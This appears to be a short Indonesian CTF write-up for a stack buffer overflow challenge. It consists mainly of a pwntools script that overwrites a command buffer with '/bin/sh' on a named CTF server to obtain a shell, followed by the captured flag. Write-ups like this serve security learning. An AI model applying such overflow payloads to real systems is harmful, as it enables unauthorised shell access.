decompile chall dengan ida pro

![image.png]( {https://postimg.cc/4KNg5DZb} )

karena saya malas nulis writeup, intinya itu stack exploitation dengan teknik buffer overflow. saya membuat script seperti ini

```
from pwn import *
import sys

EXECUTABLE = "./chall"
HOST, PORT = "pwn.bbctf.fluxus.co.in", 4001
elf = ELF(EXECUTABLE)


if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process([EXECUTABLE])

    cmd = """
    source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py
    b *main+0x54
    """
    gdb.attach(io, gdbscript=cmd)

# p = b"no\n"
# p += b"\x00"*5

p = b"A"*8 # -> buf[8]
p += b"/bin/sh\x00" # -> command[24]

io.sendafter(b"?\n", p)
io.interactive()
```

![image.png]( {https://postimg.cc/pyXycSVT} )

<b>flag{4_Cl45siC_M3m0ry_C0rrupt10N}</b>
